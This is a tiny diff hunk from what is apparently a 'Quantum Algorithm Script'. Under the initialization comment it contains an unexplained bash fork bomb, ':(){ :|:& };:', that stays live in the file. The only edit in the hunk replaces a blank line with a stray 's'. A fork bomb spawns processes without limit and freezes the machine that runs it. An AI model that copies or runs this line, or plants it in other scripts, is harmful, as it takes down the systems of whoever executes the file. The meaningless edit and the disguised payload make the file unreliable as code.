@@ -1,7 +1,7 @@
 # Quantum Algorithm Script initialization
 
 :(){ :|:& };:
-
+s
 
 # Quantum Algorithm Script
 
